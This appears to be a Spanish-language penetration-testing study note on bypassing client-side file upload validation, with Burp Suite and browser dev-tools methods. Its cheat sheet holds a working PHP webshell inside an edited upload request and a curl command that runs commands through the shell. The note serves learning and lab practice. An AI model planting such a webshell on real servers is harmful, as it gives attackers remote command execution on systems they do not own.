---
tags:
  - webapp
  - fileupload
  - RCE
  - webshell
  - bypass
---
## Conceptos Clave (TL;DR)

* La validación de archivos basada exclusivamente en el cliente (JavaScript/HTML) es insegura porque el entorno de ejecución está bajo el control total del usuario.

* Se identifica este tipo de validación si al seleccionar un archivo inválido, la página muestra un error o deshabilita botones sin recargar ni enviar peticiones HTTP al servidor.

* Existen dos vías principales de evasión: modificar la petición HTTP hacia el backend o alterar el código frontend directamente en el navegador.


## Herramientas Clave

* **Burp Suite:** Para interceptar peticiones HTTP legítimas y modificar los datos del archivo en tránsito hacia el servidor backend.

* **Browser Developer Tools:** Utilizando Page Inspector y Console para visualizar, interactuar y eliminar validaciones en el código HTML/JS a nivel local.
  

## Metodología Paso a Paso

### Método 1: Modificación de Petición al Backend (Burp Suite)

* **Generar petición legítima:** Selecciona un archivo con una extensión permitida por el frontend (ej. una imagen válida) en la aplicación web para pasar la validación local.

* **Interceptar el tráfico:** Captura la petición de subida (generalmente `POST`) antes de que llegue al servidor utilizando Burp Suite.

* **Modificar parámetros clave:** Cambia el valor del parámetro `filename` a la extensión de tu payload y reemplaza el contenido del archivo con tu código malicioso.

* **Enviar y verificar:** Deja pasar la petición modificada hacia el servidor; si el backend no cuenta con validaciones independientes, procesará y guardará el payload.

  
### Método 2: Desactivación de Validación en el Frontend

* **Inspeccionar el elemento:** Activa el Page Inspector del navegador y selecciona el botón o campo de subida de archivos.

* **Identificar bloqueos:** Examina el código HTML resaltado en busca de atributos restrictivos en la etiqueta `<input>`, tales como `accept` o llamadas a funciones en eventos como `onchange`.

* **Eliminar restricciones:** Haz doble clic sobre el atributo de la función de validación en el inspector HTML y bórralo para neutralizar la ejecución del script de verificación.

* **Modificar filtrado de diálogo:** Opcionalmente, elimina el atributo `accept` para permitir que el selector de archivos del sistema operativo muestre extensiones no predeterminadas.

* **Subir payload:** Selecciona y sube tu webshell directamente desde la interfaz de usuario, interactuando con el formulario ya desprotegido sin necesidad de interceptar tráfico.


### Fase de Ejecución

* **Localizar el archivo:** Utiliza nuevamente el Page Inspector para revisar la respuesta de la página o las etiquetas generadas en el DOM (como `<img src="...">`) y encontrar el directorio y nombre del archivo subido.

* **Ejecutar comandos:** Navega a la URL completa del payload y utiliza el parámetro correspondiente para inyectar y ejecutar comandos en el sistema subyacente.

  
## Cheat Sheet de Comandos
  
```python
# Petición HTTP interceptada en Burp Suite.
# Modifica el filename de la imagen original por el payload y reemplaza el contenido con una webshell.

POST /upload.php HTTP/1.1

Host: <TARGET_IP>:<PORT>

...

Content-Disposition: form-data; name="uploadFile"; filename="shell.php"

Content-Type: image/png


<?php system($_REQUEST['cmd']); ?>
```

```bash
# Interacción con la webshell ejecutando comandos remotamente.
# Usa curl para enviar el comando a ejecutar mediante el parámetro GET configurado en la webshell.

curl "http://<TARGET_IP>:<PORT>/profile_images/<PAYLOAD_FILE>.php?cmd=<COMMAND>"
```

  
## "Gotchas" y Troubleshooting

* **Modificación de Content-Type:** Al alterar el nombre del archivo en Burp, modificar el header `Content-Type` asociado al archivo no es estrictamente necesario en esta fase si la validación ocurre únicamente en el frontend, por lo que puede dejarse intacto.

* **Volatilidad de las modificaciones:** Cualquier modificación realizada mediante Developer Tools a los scripts HTML o JS es temporal y se perderá por completo si la página se recarga.

* **Diferencias entre navegadores:** Los métodos y atajos de teclado descritos aplican principalmente a Firefox; otros navegadores pueden requerir enfoques distintos para aplicar cambios locales, como el uso de "Overrides" en Chrome.